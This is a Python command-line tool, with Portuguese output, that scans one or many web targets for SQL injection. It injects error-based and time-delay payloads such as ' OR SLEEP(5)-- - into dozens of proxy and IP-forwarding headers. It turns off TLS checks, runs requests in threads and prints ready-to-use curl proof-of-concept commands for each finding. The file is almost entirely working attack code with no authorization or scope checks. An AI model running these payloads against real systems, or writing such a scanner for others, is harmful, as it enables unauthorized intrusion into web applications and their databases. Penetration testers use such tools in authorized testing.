#!/usr/bin/env python3

import requests
import time
import argparse
import statistics
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

# ---------------- CONFIG ----------------

IGNORED_STATUS = [401, 403, 404, 429]

HEADERS_LIST = [
    "X-Forwarded-For","Forwarded","X-Real-IP","X-Forwarded","X-Forwarded-By",
    "X-Forwarded-Host","X-Forwarded-Server","X-Forwarded-Port","X-Forwarded-Proto",
    "X-Forwarded-Scheme","X-Forwarded-SSL","CF-Connecting-IP","True-Client-IP",
    "Fastly-Client-IP","X-Azure-ClientIP","X-Google-Real-IP",
    "CloudFront-Viewer-Address","CloudFront-Viewer-Country","X-Amzn-Trace-Id",
    "X-Edge-IP","X-Client-IP","X-Cluster-Client-IP","X-ProxyUser-IP",
    "WL-Proxy-Client-IP","Proxy-Client-IP","X-Original-Forwarded-For",
    "X-Originating-IP","X-Original-IP","X-Remote-IP","X-Remote-Addr",
    "X-Original-Remote-Addr","Client-IP","Client-IP-Addr","Remote-Addr",
    "Remote-IP","Real-IP","X-Proxy-IP","X-Forwarded-For-Original",
    "Forwarded-For","X-Forwarded-For-IP","X-Forwarded-For-Client-IP",
    "X-Forwarded-For-Remote-Addr","X-Custom-IP-Authorization","X-User-IP",
    "X-Client-IP-Addr","X-Client-Address","X-Remote-User-IP",
    "X-Remote-User-Addr","Front-End-Https","X-HTTPS","X-Original-URL",
    "X-Rewrite-URL","Akamai-Origin-Hop","X-Sucuri-Clientip",
    "X-Imperva-Client-IP","X-NF-Client-Connection-IP",
    "X-Vercel-Forwarded-For","Fly-Client-IP","X-Shopify-Client-Ip",
    "X-Cdn-Client-Ip","X-Bb-Ip"
]
ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1",
    "\" OR \"1\"=\"1", "'--"
]

TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "' OR pg_sleep(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--"
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "mysqli_fetch",
    "pg_query",
    "sqlite error",
    "ora-01756",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

TIME_SLEEP = 5
REPEAT_TIME_TESTS = 2

# ---------------- CURL ----------------

def build_curl(url, header, payload):
    return f"""curl -i -s -k "{url}" \\
  -H "{header}: {payload}" \\
  -H "User-Agent: Mozilla/5.0" """

# ---------------- CORE ----------------

def request_once(url, headers=None, timeout=10):
    start = time.time()

    try:
        r = requests.get(url, headers=headers or {}, timeout=timeout, verify=False)
        return {
            "ok": True,
            "status": r.status_code,
            "text": (r.text or "").lower(),
            "elapsed": time.time() - start
        }
    except:
        return {"ok": False, "status": 0, "text": "", "elapsed": time.time() - start}


def get_baseline(url):
    times = []

    for _ in range(3):
        r = request_once(url)
        if r["ok"]:
            times.append(r["elapsed"])
        time.sleep(0.5)

    if not times:
        return None

    return {
        "time": statistics.mean(times)
    }

# ---------------- DETECTION ----------------

def has_sql_error(resp, baseline_texts=[]):
    for sig in ERROR_SIGNATURES:
        if sig in resp["text"]:
            if not any(sig in b for b in baseline_texts):
                return True, sig
    return False, None

# ---------------- TESTS ----------------

def test_error_based(url, header):
    findings = []

    for payload in ERROR_PAYLOADS:
        resp = request_once(url, headers={header: payload})

        if not resp["ok"] or resp["status"] in IGNORED_STATUS:
            continue

        has_error, sig = has_sql_error(resp)

        if has_error:
            findings.append({
                "type": "ERROR",
                "header": header,
                "payload": payload,
                "confidence": "HIGH",
                "reason": f"SQL error detected: {sig}"
            })

    return findings


def test_time_based(url, header, baseline):
    findings = []

    for payload in TIME_PAYLOADS:
        delays = []

        for _ in range(REPEAT_TIME_TESTS):
            resp = request_once(url, headers={header: payload}, timeout=15)

            if not resp["ok"] or resp["status"] in IGNORED_STATUS:
                continue

            delays.append(resp["elapsed"])
            time.sleep(0.5)

        if not delays:
            continue

        avg = statistics.mean(delays)

        if avg >= baseline["time"] + TIME_SLEEP - 1:
            findings.append({
                "type": "TIME",
                "header": header,
                "payload": payload,
                "confidence": "MEDIUM",
                "reason": f"Delay detectado: baseline {baseline['time']:.2f}s → {avg:.2f}s"
            })

    return findings


def test_header(url, header, baseline):
    findings = []
    findings.extend(test_error_based(url, header))
    findings.extend(test_time_based(url, header, baseline))
    return findings

# ---------------- MAIN ----------------

def normalize_url(target):
    if target.startswith("http"):
        return target

    for scheme in ["https://", "http://"]:
        try:
            r = requests.get(scheme + target, timeout=5, verify=False)
            print(f"[+] Alive: {scheme}{target} ({r.status_code})")
            return scheme + target
        except:
            pass

    print(f"[-] Down: {target}")
    return None


def test_target(target, threads):
    url = normalize_url(target)
    if not url:
        return

    print(f"\n=== Testando: {url} ===")

    baseline = get_baseline(url)
    if not baseline:
        print("[-] Falha baseline")
        return

    print(f"[i] Baseline time: {baseline['time']:.2f}s")

    results = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(test_header, url, h, baseline)
            for h in HEADERS_LIST
        ]

        for f in as_completed(futures):
            res = f.result()
            if res:
                results.extend(res)

    if not results:
        print("[-] Nada encontrado")
        return

    print(f"\n[!!!] Possíveis vulnerabilidades:\n")

    for item in results:
        print(f"[{item['confidence']}] {item['type']} → {item['header']}")
        print(f"Payload: {item['payload']}")
        print(f"Motivo: {item['reason']}")

        print("\n--- CURL PoC ---")
        print(build_curl(url, item['header'], item['payload']))
        print("----------------\n")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target")
    parser.add_argument("-a", "--arquivo")
    parser.add_argument("--threads", type=int, default=5)

    args = parser.parse_args()

    targets = []

    if args.target:
        targets.append(args.target)

    if args.arquivo:
        with open(args.arquivo) as f:
            targets.extend([x.strip() for x in f if x.strip()])

    if not targets:
        print("Use -t ou -a")
        return

    for t in targets:
        test_target(t, args.threads)


if __name__ == "__main__":
    main()
